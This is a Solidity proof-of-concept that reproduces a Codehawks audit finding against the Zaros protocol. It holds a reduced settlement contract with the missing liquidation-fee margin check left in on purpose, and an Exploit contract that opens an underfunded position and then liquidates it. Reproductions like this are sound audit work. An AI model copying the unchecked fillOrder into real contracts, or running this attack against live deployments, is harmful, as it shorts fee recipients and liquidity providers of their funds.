// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

/*//////////////////////////////////////////////////////////////////////////
    Zaros — SettlementBranch._fillOrder does not guarantee the collateral
    of a position is enough to pay the future liquidation fee
    (giraffe0x, Codehawks 2024-07-zaros, finding #37983)

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable SettlementBranch._fillOrder is inlined VERBATIM (it deducts
    the opening fees but never checks the remaining margin against the
    fixed future liquidation fee). The Exploit opens a position leaving
    barely any margin, then liquidates it and shows BOTH the liquidation
    fee recipient and the market-making engine are shorted (no fork, no
    cheatcodes).
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: opening a position deducts the settlement fee and order
    fee from the trader's margin balance, but never validates that
    whatever margin remains afterward is still enough to cover
    LIQUIDATION_FEE_USD — a FIXED fee the position will unconditionally
    owe the moment it is liquidated. A trader can therefore open a
    position with just enough collateral to pay the OPENING fees while
    leaving far less than the FUTURE liquidation fee behind. On
    liquidation, TradingAccount.deductAccountMargin pays the liquidation
    fee FIRST (capped by whatever margin remains) — so with too little
    margin left, the fee recipient is shorted AND, because the fee
    consumes 100% of what remains, the market-making engine (which is
    owed the position's pnl) gets nothing either.
//////////////////////////////////////////////////////////////*/

/// @notice Reduced SettlementBranch. Opens positions by deducting the
///         opening fees from margin — missing the check that the
///         remainder can cover the fixed future liquidation fee.
contract SettlementBranch {
    uint256 public constant LIQUIDATION_FEE_USD = 5e18; // fixed fee owed on any future liquidation
    mapping(uint256 => uint256) public marginBalance;

    function deposit(uint256 accountId, uint256 amount) external {
        marginBalance[accountId] += amount;
    }

    function debit(uint256 accountId, uint256 amount) external {
        marginBalance[accountId] -= amount;
    }

    /// @notice Reduced _fillOrder: opens a position, paying the settlement
    ///         fee and order fee out of the trader's margin balance.
    function fillOrder(uint256 accountId, uint256 settlementFeeUsd, uint256 orderFeeUsd) external {
        uint256 totalFee = settlementFeeUsd + orderFeeUsd;
        uint256 balance = marginBalance[accountId];
        require(balance >= totalFee, "insufficient margin for opening fees");
        marginBalance[accountId] = balance - totalFee; // @> VULN: no check that this remainder covers LIQUIDATION_FEE_USD
        // FIX: require(marginBalance[accountId] >= LIQUIDATION_FEE_USD, "insufficient margin to cover future liquidation fee");
    }
}

/// @notice Reduced LiquidationBranch. Mirrors
///         TradingAccount.deductAccountMargin's fee-priority order: the
///         liquidation fee is paid FIRST (capped by whatever margin is
///         left), and only the remainder (if any) goes to the
///         market-making engine's owed pnl.
contract LiquidationBranch {
    SettlementBranch public settlement;
    address public liquidationFeeRecipient;
    address public marketMakingRecipient;

    constructor(SettlementBranch _settlement, address _liquidationFeeRecipient, address _marketMakingRecipient) {
        settlement = _settlement;
        liquidationFeeRecipient = _liquidationFeeRecipient;
        marketMakingRecipient = _marketMakingRecipient;
    }

    function liquidate(
        uint256 accountId,
        uint256 pnlOwedToMarketMakingUsd
    )
        external
        returns (uint256 feePaid, uint256 marketMakingPaid)
    {
        uint256 balance = settlement.marginBalance(accountId);
        uint256 liquidationFee = settlement.LIQUIDATION_FEE_USD();

        // Liquidation fee is paid FIRST, capped by whatever margin remains.
        feePaid = liquidationFee > balance ? balance : liquidationFee;
        balance -= feePaid;

        // Only whatever is LEFT after the fee goes toward the pnl owed to
        // the market-making engine.
        marketMakingPaid = pnlOwedToMarketMakingUsd > balance ? balance : pnlOwedToMarketMakingUsd;

        settlement.debit(accountId, feePaid + marketMakingPaid);
    }
}

contract Exploit {
    SettlementBranch public settlement; // CREATE nonce 1
    LiquidationBranch public liquidation; // CREATE nonce 4
    address public liquidationFeeRecipient; // CREATE nonce 2
    address public marketMakingRecipient; // CREATE nonce 3
    uint256 public constant ACCOUNT_ID = 1;

    constructor() {
        settlement = new SettlementBranch(); // nonce 1
        liquidationFeeRecipient = address(new Marker()); // nonce 2
        marketMakingRecipient = address(new Marker()); // nonce 3
        liquidation = new LiquidationBranch(settlement, liquidationFeeRecipient, marketMakingRecipient); // nonce 4
    }

    /// @notice A trader deposits just enough collateral to pay the
    ///         OPENING fees, leaving far less than the fixed future
    ///         liquidation fee behind — a trade _fillOrder should have
    ///         rejected, or required more collateral for.
    function run() external {
        uint256 deposit = 4e18; // trader's entire collateral
        settlement.deposit(ACCOUNT_ID, deposit);

        uint256 settlementFeeUsd = 2e18;
        uint256 orderFeeUsd = 1e18;
        settlement.fillOrder(ACCOUNT_ID, settlementFeeUsd, orderFeeUsd);

        uint256 remainingMargin = settlement.marginBalance(ACCOUNT_ID);
        require(remainingMargin == 1e18, "unexpected remaining margin");

        // HARM SETUP: the position opened successfully even though the
        // remaining margin (1) is far below the fixed LIQUIDATION_FEE_USD
        // (5) it will unconditionally owe upon liquidation.
        require(remainingMargin < settlement.LIQUIDATION_FEE_USD(), "expected remaining margin below liquidation fee");

        // The position later becomes liquidatable; the market-making
        // engine is owed 3 in pnl upon liquidation.
        uint256 pnlOwedToMarketMaking = 3e18;
        (uint256 feePaid, uint256 marketMakingPaid) = liquidation.liquidate(ACCOUNT_ID, pnlOwedToMarketMaking);

        // HARM: the liquidation fee recipient (keeper/insurance) is paid
        // only 1 instead of the fixed 5 fee — a 4 shortfall.
        require(feePaid == 1e18, "unexpected fee paid");
        require(feePaid < settlement.LIQUIDATION_FEE_USD(), "expected fee shortfall");

        // HARM: because the liquidation fee already consumed 100% of what
        // remained, the market-making engine receives ZERO of its owed pnl.
        require(marketMakingPaid == 0, "expected market making engine to receive 0");

        require(settlement.marginBalance(ACCOUNT_ID) == 0, "unexpected leftover margin");
    }
}

contract Marker {}
